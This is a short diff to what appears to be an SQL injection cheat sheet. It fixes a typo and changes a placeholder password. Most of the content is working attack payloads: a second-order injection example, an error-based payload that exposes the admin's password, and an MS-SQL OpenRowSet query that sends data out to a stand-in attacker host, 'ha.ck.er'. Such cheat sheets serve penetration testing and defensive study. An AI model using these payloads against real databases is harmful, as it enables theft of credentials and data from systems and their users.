@@ -78,14 +78,14 @@ a'''''''''''''''''''''''''''''''''''''''''''' ... # odd number
 * Second-Order
 INSERT INTO users (username, password, ID, privs) VALUES ('foo''', ... -> inserts "foo'" in db
 
-SELECT password FRO? users WHERE username = 'foo'' -> unclosed quotation mark before 'foo
+SELECT password FROM users WHERE username = 'foo'' -> unclosed quotation mark before 'foo
 
 payload: ' or 1 in (select password from users where username ='admin')--
 will show the admin's password in error msg
 
 * Out-of-Band exfiltration
 MS-SQL: OpenRowSet
-insert into openrowset('SQLOLEDB','DRIVER=(SQL Server);SERVER=ha.ck.er:80;UID=sa;PWD=letmein','select * from foo') values (@@version)
+insert into openrowset('SQLOLEDB','DRIVER=(SQL Server);SERVER=ha.ck.er:80;UID=sa;PWD=p4ss','select * from foo') values (@@version)
 
 Oracle
 UTL_HTTP supports proxy servers, cookies, redirects, and authentication
